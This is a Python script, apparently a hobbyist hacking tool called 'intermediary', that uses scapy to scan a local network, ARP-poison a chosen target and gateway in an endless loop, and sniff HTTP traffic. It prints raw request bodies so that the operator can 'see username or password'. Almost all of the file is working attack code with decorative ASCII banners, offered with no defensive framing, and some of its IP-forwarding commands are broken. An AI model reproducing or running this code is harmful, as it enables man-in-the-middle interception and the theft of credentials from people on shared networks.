import scapy.all 
import subprocess
import termcolor as color
import time
import optparse
from scapy.layers import http


#banner
print(color.colored("""
                                                                                                                                      
                88                                                                                       88  88                                       
                ""                ,d                                                                     88  ""                                       
                                88                                                                     88                                           
                88  8b,dPPYba,  MM88MMM  ,adPPYba,  8b,dPPYba,  88,dPYba,,adPYba,    ,adPPYba,   ,adPPYb,88  88  ,adPPYYba,  8b,dPPYba,  8b       d8  
                88  88P'   `"8a   88    a8P_____88  88P'   "Y8  88P'   "88"    "8a  a8P_____88  a8"    `Y88  88  ""     `Y8  88P'   "Y8  `8b     d8'  
                88  88       88   88    8PP"""""""  88          88      88      88  8PP"""""""  8b       88  88  ,adPPPPP88  88           `8b   d8'   
                88  88       88   88,   "8b,   ,aa  88          88      88      88  "8b,   ,aa  "8a,   ,d88  88  88,    ,88  88            `8b,d8'    
                88  88       88   "Y888  `"Ybbd8"'  88          88      88      88   `"Ybbd8"'   `"8bbdP"Y8  88  `"8bbdP"Y8  88              Y88'     
                                                                                                                                            d8'      
                                                                                                                                            d8'     
                                                                                             
""".center(20),color="blue"))

class Main():
    try:
        choosing = input("developed by egemen 2024 ©\n\nhelp for press ?\n> ")
        time.sleep(1)
        print(color.colored("*",color="blue"))
        time.sleep(1)
        print(color.colored("***",color="blue"))
        time.sleep(1)
        print(color.colored("******",color="blue"))
        time.sleep(1)
    except KeyboardInterrupt:
        subprocess.call(["echo","0","/proc/sys/net/ipv4/ip_forward"])
        print("byee!")

    #fundamental knowledge
    def __init__(self):
        try:
            if self.choosing == "scan_devices":
                self.get_user_input()
                self.scan_network_area()
                self.show_time()
        except AttributeError:
            subprocess.call(["echo","0","/proc/sys/net/ipv4/ip_forward"])
            print("\nbyee!")
            exit()
        try:       
            if self.choosing == "exit" or self.choosing == "quit":
                print("\nbyee!")
                #ip forwarding disabled 
                subprocess.call(["echo","0","/proc/sys/net/ipv4/ip_forward"])
                exit()
        except AttributeError:
            subprocess.call(["echo","0","/proc/sys/net/ipv4/ip_forward"])
            print("\nbyee!")
            exit()
        try:

            if self.choosing == "?" or self.choosing == "help":
                print("\nif you want to use scan_devices you have to use like this => python intermediary.py -r <ip range>")
                print("if you want to use listen_packets you have to use like this => python intermediary.py -i <your network interface>\n")
                print("usage => python intermediary.py -r <ip_address_range> -i <your_network_interface>\nexample => python3 intermediary.py -r 192.168.1.0/24 -i wlan0")
                print("\n-----------\nall process\n-----------\n"+color.colored("scan_devices"+"\nlisten_packets",color=("light_red")))
                print(color.colored("poison",color=("light_red"))+"\n-----------\n")
                #ip forwarding disabled 
                subprocess.call(["echo","0","/proc/sys/net/ipv4/ip_forward"])
                quit()
        except AttributeError:
            print("\nbyeee!")
            exit()

        try:        
            if self.choosing == "poison":
                print(color.colored("""

                                                            ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⠻⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
                                                            ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣇⠀⠀⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
                                                            ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠏⢀⠀⠀⠙⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
                                                            ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠇⠀⠀⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⣿⡆⠀⠀⢹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
                                                            ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣻⣿⣿⠀⠀⠀⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
                                                            ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠛⠻⣿⣿⣿⣿⣿⣿⢽⣿⣿⣿⣿⣿⣿⣿⡻⣿⠟⠃⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
                                                            ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠄⠀⠀⠀⠀⠀⠛⠛⠿⠿⣿⢻⣿⣿⣯⡿⠿⢿⢿⣿⣿⠏⠀⠀⠀⠀⠀⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
                                                            ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⢓⣘⣉⣷⣿⣿⣿⣧⣿⣿⣿⡟⠁⠀⠀⠀⠀⠀⠀⢨⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
                                                            ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⢻⢿⣿⣿⣿⣿⣿⣿⢻⡟⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
                                                            ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠀⣀⠀⠀⠀⠀⠀⠀⠘⢧⣿⣿⣿⣿⣿⠷⠟⠁⠀⠀⠀⠀⠀⢀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
                                                            ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⣿⣷⡄⠀⠀⠀⠀⠀⠀⣌⣿⣿⣿⡏⠀⠀⠀⠀⠀⠀⢀⣶⣿⣄⣤⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
                                                            ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣿⣿⣿⣷⣶⣿⣿⣿⣶⣶⣿⣿⣿⣧⣀⣶⣭⣶⣶⣿⣯⣿⣿⣿⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
                                                            ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⢹⣿⣯⣿⣿⣿⣿⣿⣿⣿⣿⣿⣼⣿⣿⣿⣿⣿⡿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
                                                            ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣸⢘⢹⣿⢹⡟⢻⠟⢿⠟⣿⣿⣿⣿⣿⠟⢿⠘⣶⣌⣽⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
                                                            ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣾⣼⣿⢸⡇⠀⠀⠘⠀⢹⡏⠸⠃⢸⠀⢸⢸⠁⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
                                                            ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣸⣠⡄⢠⡀⣸⠀⢸⡅⠘⡄⢸⡇⢸⣼⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
                                                            ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢿⣿⣧⣸⡇⢹⠀⣿⡇⢠⡇⢸⣷⣿⡟⢢⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
                                                            ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠾⣿⣿⣿⣿⢸⣧⣿⣧⣼⠀⣿⣿⣿⡍⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
                                                            ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡗⠀⢿⣿⣿⣿⣾⣿⣿⡟⣿⣾⣿⣿⣿⠷⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
                                                            ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⣽⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
                                                            ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣯⣇⣸⠿⡏⣿⣿⣿⢿⣿⣿⢻⣿⣿⠁⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
                                                            ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣽⠀⢱⣿⢿⡇⠸⡿⣿⠀⣿⡏⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
                                                            ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢹⡿⢃⠘⠈⡇⢀⡀⢿⠀⡟⡅⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
                                                            ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣾⣷⣾⣼⡀⣧⢸⡇⢸⡀⣤⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
                                                            ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣾⣷⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
                                    

    """,color="red"))
                
                subprocess.call(["echo","1","/proc/sys/net/ipv4/ip_forward"])
                self.target_ip = input("specify target ip address: ")
                self.poisened_ip = input("specify poisened ip address: ")
                self.obtained_mac_address()
                numeric = 0
                
                while True:
                    numeric = numeric +2
                    self.poisoning(self.target_ip,self.poisened_ip)
                    self.poisoning(self.poisened_ip,self.target_ip)
                    print(color.colored("\r sending packets",color="light_green") + color.colored(str(numeric),color="light_green"),end="")
                    time.sleep(2)
        except AttributeError:
            subprocess.call(["echo","0","/proc/sys/net/ipv4/ip_forward"])
            print("\nbyeee!")
            exit()
        
        if self.choosing == "listen_packets":
            print(color.colored("""
⠀⠀⠀⠀⠀⠀⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢀⣴⣿⣿⠿⣟⢷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢸⣏⡏⠀⠀⠀⢣⢻⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢸⣟⠧⠤⠤⠔⠋⠀⢿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣿⡆⠀⠀⠀⠀⠀⠸⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠘⣿⡀⢀⣶⠤⠒⠀⢻⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢹⣧⠀⠀⠀⠀⠀⠈⢿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣿⡆⠀⠀⠀⠀⠀⠈⢿⣆⣠⣤⣤⣤⣤⣴⣦⣄⡀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢀⣾⢿⢿⠀⠀⠀⢀⣀⣀⠘⣿⠋⠁⠀⠙⢇⠀⠀⠙⢿⣦⡀⠀⠀⠀⠀⠀
⠀⠀⠀⢀⣾⢇⡞⠘⣧⠀⢖⡭⠞⢛⡄⠘⣆⠀⠀⠀⠈⢧⠀⠀⠀⠙⢿⣄⠀⠀⠀⠀
⠀⠀⣠⣿⣛⣥⠤⠤⢿⡄⠀⠀⠈⠉⠀⠀⠹⡄⠀⠀⠀⠈⢧⠀⠀⠀⠈⠻⣦⠀⠀⠀
⠀⣼⡟⡱⠛⠙⠀⠀⠘⢷⡀⠀⠀⠀⠀⠀⠀⠹⡀⠀⠀⠀⠈⣧⠀⠀⠀⠀⠹⣧⡀⠀
⢸⡏⢠⠃⠀⠀⠀⠀⠀⠀⢳⡀⠀⠀⠀⠀⠀⠀⢳⡀⠀⠀⠀⠘⣧⠀⠀⠀⠀⠸⣷⡀
⠸⣧⠘⡇⠀⠀⠀⠀⠀⠀⠀⢳⡀⠀⠀⠀⠀⠀⠀⢣⠀⠀⠀⠀⢹⡇⠀⠀⠀⠀⣿⠇
⠀⣿⡄⢳⠀⠀⠀⠀⠀⠀⠀⠈⣷⠀⠀⠀⠀⠀⠀⠈⠆⠀⠀⠀⠀⠀⠀⠀⠀⣼⡟⠀
⠀⢹⡇⠘⣇⠀⠀⠀⠀⠀⠀⠰⣿⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡄⠀⣼⡟⠀⠀
⠀⢸⡇⠀⢹⡆⠀⠀⠀⠀⠀⠀⠙⠁⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⢳⣼⠟⠀⠀⠀
⠀⠸⣧⣀⠀⢳⡀⠀⠀⠀⠀⠀⠀⠀⡄⠀⠀⠀⠀⠀⠀⠀⢃⠀⢀⣴⡿⠁⠀⠀⠀⠀
⠀⠀⠈⠙⢷⣄⢳⡀⠀⠀⠀⠀⠀⠀⢳⡀⠀⠀⠀⠀⠀⣠⡿⠟⠛⠉⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠈⠻⢿⣷⣦⣄⣀⣀⣠⣤⠾⠷⣦⣤⣤⡶⠟⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠈⠉⠛⠛⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀

                                
LİSTENİNG STARTED !!!

when you stop the arp poisoingn you will be see username or password !                                                                                            
""",color=("green")))
            self.listen_packets()

    def get_user_interface(self):
        parse_object = optparse.OptionParser()
        parse_object.add_option('-i','--interface',dest='network_interface',help='usage => python intermediary.py -r <ip_address_range> -i <your_network_interface>\nexample => python3 intermediary.py -r 192.168.1.0/24 -i wlan0')
        (user_arguments,arguments) = parse_object.parse_args()
        return user_arguments.network_interface

    def get_user_input(self):
        parse_object = optparse.OptionParser()
        parse_object.add_option('-r','--range',dest='ip_address_range',help='usage => python intermediary.py -r <ip_address_range>\nexample => python3 intermediary.py -r 192.168.1.0/24')
        (user_input,arguments) = parse_object.parse_args()
        return user_input.ip_address_range
        # ip_address = input("please enter ip address range!\nlike this => 192.168.1.0/24\n:")
        
    
    def scan_network_area(self):
        arp_request = scapy.all.ARP(pdst=self.get_user_input())
        broadcast_request = scapy.all.Ether(dst="ff:ff:ff:ff:ff:ff")
        combined_packets = broadcast_request/arp_request
        sending_request = scapy.all.srp(combined_packets,timeout=1,verbose=False)
        (answered,unanswered) = sending_request
        return answered

    def show_time(self):
        results = self.scan_network_area()
        results.show( lambda s,r: r.sprintf("%ARP.psrc% \t %Ether.src%") )
        print(results)
        #ip forwarding disabled 
        subprocess.call(["echo","0","/proc/sys/net/ipv4/ip_forward"])
        # print(list(results))

    def obtained_mac_address(self):
        arp_request_packet = scapy.all.ARP(pdst=self.target_ip)
        broadcast_packet = scapy.all.Ether(dst="ff:ff:ff:ff:ff:ff")
        combined_packet =  broadcast_packet/arp_request_packet
        answered_list = scapy.all.srp(combined_packet,timeout=1,verbose=False)[0]
        return (list(answered_list)[0][1].hwsrc)


    def poisoning(self,target_ip,poisened_ip):
        #ip forwarding enabled
        response = scapy.all.ARP(op=2,pdst=target_ip,psrc=poisened_ip)
        scapy.all.send(response,verbose=False)

    #sniffing packets enabled
    def listen_packets(self):
        scapy.all.sniff(iface=self.get_user_interface(),store=False,prn=self.analyze_packets)

    #listening http packets and requests

    def analyze_packets(self,packet):
        #packet.show()
        if packet.haslayer(http.HTTPRequest):
            if packet.haslayer(scapy.all.Raw):
                print(packet[scapy.all.Raw].load)

#problem unlimited loop!

while True:
    Main()